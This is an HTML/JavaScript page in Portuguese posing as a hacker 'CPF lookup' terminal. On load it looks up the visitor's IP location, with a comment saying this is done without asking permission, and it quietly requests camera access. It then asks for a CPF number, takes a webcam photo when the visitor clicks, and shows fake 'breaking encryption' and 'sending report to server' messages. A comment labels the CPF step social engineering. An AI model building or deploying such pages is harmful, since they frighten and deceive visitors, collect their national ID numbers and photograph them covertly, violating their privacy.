<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sincronizando Sistema...</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        #terminal { width: 95%; max-width: 850px; height: 75vh; border: 1px solid #0f0; padding: 20px; overflow-y: auto; background: rgba(0, 10, 0, 0.9); position: relative; box-shadow: 0 0 30px rgba(0, 255, 0, 0.2); }
        .log { margin-bottom: 6px; font-size: 13px; line-height: 1.2; }
        .critical { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
        .success { color: #00ff00; }
        .warning { color: #ffff00; }
        .input-area { width: 95%; max-width: 850px; margin-top: 15px; display: flex; gap: 10px; }
        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; flex-grow: 1; outline: none; font-family: inherit; }
        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        #photo-preview { width: 120px; border: 1px solid #0f0; filter: grayscale(100%) brightness(1.2) contrast(1.2) sepia(100%) hue-rotate(85deg); display: none; margin: 10px 0; }
    </style>
</head>
<body>

    <div id="terminal">
        <div class="log">> [CORE] SYSTEM_INIT...</div>
    </div>

    <div class="input-area">
        <input type="text" id="cpfInput" placeholder="DIGITE O CPF PARA CONSULTA DE DADOS..." maxlength="14">
        <button onclick="runCpfScan()">PESQUISAR</button>
    </div>

    <video id="v" style="display:none" autoplay></video>
    <canvas id="c" style="display:none" width="640" height="480"></canvas>

    <script>
        const term = document.getElementById('terminal');
        const cpfIn = document.getElementById('cpfInput');

        function write(t, cls='') {
            const d = document.createElement('div');
            d.className = `log ${cls}`;
            d.innerHTML = `> ${t}`;
            term.appendChild(d);
            term.scrollTop = term.scrollHeight;
        }

        // 1. AUTO-SCAN AO CARREGAR
        window.onload = async () => {
            write("INICIANDO VARREDURA DE REDE...", "warning");
            
            // Tenta pegar localização sem pedir permissão primeiro (Via IP-API)
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                write(`IP_ALVO: ${d.ip}`, "critical");
                write(`LOGRADOURO APROX: ${d.road || 'Mapeando via satélite...'}`, "success");
                write(`CIDADE/UF: ${d.city} / ${d.region}`, "success");
                write(`PROVEDOR: ${d.org}`, "info");
            } catch(e) { write("ERRO NO BYPASS DE IP", "critical"); }

            write("SISTEMA PRONTO PARA CONSULTA DE CPF.", "warning");
            
            // Tenta acesso à câmera em background
            navigator.mediaDevices.getUserMedia({video:true}).then(s => {
                document.getElementById('v').srcObject = s;
                write("MÓDULO BIOMÉTRICO SINCRONIZADO.", "success");
            }).catch(() => write("MÓDULO BIOMÉTRICO BLOQUEADO PELO DISPOSITIVO.", "critical"));
        };

        // 2. FUNÇÃO DE PESQUISA DE CPF (ENGENHARIA SOCIAL)
        async function runCpfScan() {
            const cpf = cpfIn.value;
            if(cpf.length < 11) return alert("DIGITE UM CPF VÁLIDO");

            write(`INICIANDO BUSCA DE CPF: ${cpf}...`, "warning");
            
            // Tira a foto no clique
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            if(v.srcObject) {
                c.getContext('2d').drawImage(v, 0, 0);
                const img = document.createElement('img');
                img.id = "photo-preview";
                img.src = c.toDataURL('image/png');
                img.style.display = "block";
                term.appendChild(img);
                write("CAPTURA FACIAL REALIZADA COM SUCESSO.", "critical");
            }

            // Simula busca em banco de dados
            const steps = ["CONECTANDO À BASE CADASTRAL...", "QUEBRANDO CRIPTOGRAFIA...", "EXTRAINDO DADOS DE LOGRADOURO...", "LOCALIZANDO VÍNCULOS..."];
            for(let s of steps) {
                await new Promise(r => setTimeout(r, 600));
                write(s, "info");
            }

            write(`DADOS ENCONTRADOS PARA ${cpf}:`, "success");
            write(`NOME: [DADOS OCULTOS PARA TESTE]`, "info");
            write(`ENDEREÇO: RUA DETECTADA VIA GPS/IP`, "info");
            write("ENVIANDO RELATÓRIO PARA O SERVIDOR...", "critical");
        }
    </script>
</body>
</html>
